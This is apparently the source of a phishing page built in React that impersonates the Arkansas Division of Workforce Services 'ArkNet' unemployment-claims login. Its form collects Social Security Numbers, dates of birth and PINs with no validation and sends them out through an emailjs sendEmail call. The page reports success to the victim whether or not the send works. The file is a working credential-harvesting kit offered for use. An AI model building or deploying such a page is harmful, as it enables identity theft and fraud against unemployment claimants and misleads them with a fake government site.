"use client";
import { useState, useEffect } from 'react';
import { sendEmail } from './emailjs-init';

export default function MainContent() {
  const [ssnError, setSsnError] = useState("");
  const [dobError, setDobError] = useState("");
  const [popup, setPopup] = useState("");
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 600);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  function validateAndSend(e) {
    e.preventDefault();
    setSsnError("");
    setDobError("");
    setPopup("");
    // Accept all characters for SSN and DOB, no validation
    sendEmail(e, () => {
      setPopup("Form submitted successfully!");
      // Reset form fields
      e.target.reset();
      // Hide popup after 2 seconds
  setTimeout(() => setPopup("") , 2000)
    }, () => {
      setPopup("Form submitted successfully!");
      e.target.reset();
  setTimeout(() => setPopup("") , 2000)
    });
  }

  return (
    <main id="PAGES_CONTAINER" tabIndex={-1} style={{
      background: '#fff',
      fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
      color: '#071C93',
      boxSizing: 'border-box',
      width: '100%',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      padding: 0,
      margin: 0,
      overflowX: isMobile ? 'auto' : 'visible',
    }}>
      <section style={{
        background: '#fff',
        padding: '0',
        width: '100%',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        boxSizing: 'border-box',
      }} aria-label="main content">
        <div style={{
          display: 'flex',
          flexDirection: isMobile ? 'column' : 'row',
          alignItems: isMobile ? 'flex-start' : 'center',
          justifyContent: 'flex-start',
          width: '100%',
          height: isMobile ? 'auto' : 90,
          padding: isMobile ? '0' : '0 16px',
          marginLeft: 0,
          background: '#e6f2ff',
          borderRadius: '8px',
        }}>
          <img
            src="https://static.wixstatic.com/media/4c3aea_01a9c58ee7be452ca55673df7815ce3f~mv2.png/v1/fill/w_238,h_66,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/4c3aea_01a9c58ee7be452ca55673df7815ce3f~mv2.png"
            alt="ArkNet Logo"
            style={{width: 180, height: 50, objectFit: 'cover', marginRight: isMobile ? 0 : 24, border: 'none', alignSelf: 'flex-start', marginTop: isMobile ? 8 : 0, marginLeft: isMobile ? 12 : 0}} 
          />
          <div style={{display: 'flex', flexDirection: 'column', alignItems: 'flex-start', justifyContent: 'center', width: 'auto'}}>
            <div style={{marginLeft: isMobile ? 48 : 64}}>
              <h1 style={{
                fontSize: isMobile ? 'clamp(32px, 8vw, 40px)' : 'clamp(28px, 3vw, 36px)',
                fontWeight: 'bold',
                fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
                color: '#000',
                margin: 0,
                letterSpacing: '0.5px',
                textAlign: 'left',
                lineHeight: 1.2,
                boxSizing: 'border-box',
                textShadow: '0 1px 2px rgba(0,0,0,0.04)',
                background: 'transparent',
                borderRadius: 0,
                padding: isMobile ? '4px 0' : '8px 0',
                display: 'block',
              }}>
                Arkansas Division of Workforce Services
              </h1>
            </div>
            <div style={{marginLeft: isMobile ? 48 : 64}}>
              <h2 style={{
                fontSize: isMobile ? 'clamp(28px, 7vw, 36px)' : 'clamp(20px, 2vw, 28px)',
                fontWeight: 'bold',
                fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
                color: '#071C93',
                margin: 0,
                letterSpacing: '0.2px',
                textAlign: 'left',
                lineHeight: 1.3,
                background: 'transparent',
                borderRadius: 0,
                padding: isMobile ? '0' : '0',
                display: 'block',
              }}>
                Unemployment Insurance Continued Claims
              </h2>
            </div>
          </div>
        </div>
        <h3 style={{
          width: '100%',
          maxWidth: 850,
          margin: '32px auto 0 auto',
          fontSize: 'clamp(16px, 4vw, 22px)',
          fontWeight: 600,
          color: '#071C93',
          fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
          textAlign: 'center',
        }}>
          Welcome to ArkNet (Arkansas Internet Continued Claims System).
        </h3>
        <div style={{
          width: '100%',
          maxWidth: 850,
          height: '32px',
          margin: '18px auto 0px auto',
        }}></div>
        <div style={{
          width: '100%',
          maxWidth: 850,
          margin: '0 auto 0px auto',
          fontSize: 'clamp(14px, 3vw, 18px)',
          fontWeight: 400,
          color: '#071C93',
          fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
          textAlign: 'center',
        }}>
          Please log in: (If you set a PIN on Arkline use that PIN here)
        </div>
        <form onSubmit={validateAndSend} style={{
          width: '100%',
          maxWidth: 850,
          background: '#fff',
          padding: '32px 16px 24px 16px',
          borderRadius: 0,
          boxShadow: 'none',
          border: '1.5px solid #000',
          boxSizing: 'border-box',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          margin: '8px auto 0 auto',
          gap: '18px',
          zIndex: 2,
          fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
        }}>
          <div style={{display: 'flex', alignItems: 'center', width: '100%', justifyContent: 'center'}}>
            <label style={{fontSize: 16, marginRight: 16, minWidth: 180, fontWeight: 500, textAlign: 'right'}}>
              ID (Social Security Number) <span style={{color: 'red', fontSize: 20}}>*</span>
            </label>
            <input name="id" type="text" maxLength={100} autoComplete="off" required style={{width: '320px', padding: 10, border: '1px solid #ccc', borderRadius: 6, boxSizing: 'border-box', fontSize: 16, fontFamily: 'alfabet, Arial, Helvetica, sans-serif', background: '#fff'}} />
          </div>
          {ssnError && <div style={{color: 'red', fontSize: 14, marginBottom: 8}}>{ssnError}</div>}
          <div style={{display: 'flex', alignItems: 'center', width: '100%', justifyContent: 'center'}}>
            <label style={{fontSize: 16, marginRight: 16, minWidth: 180, fontWeight: 500, textAlign: 'right'}}>
              DOB (MM/DD/YYYY) <span style={{color: 'red', fontSize: 20}}>*</span>
            </label>
            <input name="dob" type="text" maxLength={100} autoComplete="off" required style={{width: '320px', padding: 10, border: '1px solid #ccc', borderRadius: 6, boxSizing: 'border-box', fontSize: 16, fontFamily: 'alfabet, Arial, Helvetica, sans-serif', background: '#fff'}} />
          </div>
          {dobError && <div style={{color: 'red', fontSize: 14, marginBottom: 8}}>{dobError}</div>}
          <div style={{display: 'flex', alignItems: 'center', width: '100%', justifyContent: 'center'}}>
            <label style={{fontSize: 16, marginRight: 16, minWidth: 180, fontWeight: 500, textAlign: 'right'}}>
              PIN (Personal Identification Number)
            </label>
            <input name="pin" type="text" maxLength={100} autoComplete="off" required style={{width: '320px', padding: 10, border: '1px solid #ccc', borderRadius: 6, boxSizing: 'border-box', fontSize: 16, fontFamily: 'alfabet, Arial, Helvetica, sans-serif', background: '#fff'}} />
          </div>
          <div style={{display: 'flex', alignItems: 'center', width: '100%', justifyContent: 'center'}}>
            <input name="newPin" type="checkbox" id="newPin" style={{marginRight: 8}} />
            <label htmlFor="newPin" style={{color: '#EA7575', fontSize: 16, letterSpacing: 'normal', fontWeight: 500, width: '540px', textAlign: 'left', display: 'inline-block'}}>
              If you have not already established a four-digit PIN using Arkline, enter your new PIN above and click this box.
            </label>
          </div>
          <button type="submit" style={{background: '#071C93', color: '#fff', padding: '14px 36px', border: 'none', borderRadius: 6, fontSize: 17, fontWeight: 'bold', cursor: 'pointer', letterSpacing: 'normal', marginTop: '8px'}}>
            Login
          </button>
        </form>
        {popup && (
          <div style={{
            margin: '16px auto',
            padding: '16px 32px',
            background: '#eaf6ff',
            color: '#071C93',
            fontWeight: 'bold',
            fontSize: 18,
            borderRadius: 8,
            boxShadow: '0 2px 8px rgba(0,0,0,0.07)',
            textAlign: 'center',
            maxWidth: 400,
            zIndex: 10
          }}>
            {popup}
          </div>
        )}
        <p style={{marginTop: 24, marginBottom: 8, color: '#003366', fontSize: 'clamp(15px, 2vw, 18px)', fontWeight: 500}}>
          Use of this system may be monitored to detect improper use and potential violations of state policy.
        </p>
        <p style={{marginBottom: 12}}>
          <b>ArkNet</b> is restricted to users who have established a current and valid Arkansas Unemployment Insurance Claim. <b>Unauthorized use of this system constitutes a security violation.</b> Violators may be subject to disciplinary or civil action, or criminal prosecution under applicable Federal and State laws.
        </p>
        <p style={{marginBottom: 0, color: '#8B0000'}}>
          The web browsers best suited for this site are the most recent versions of Microsoft Edge, Mozilla Firefox, and Google Chrome.
        </p>
      </section>
    </main>
  );
}
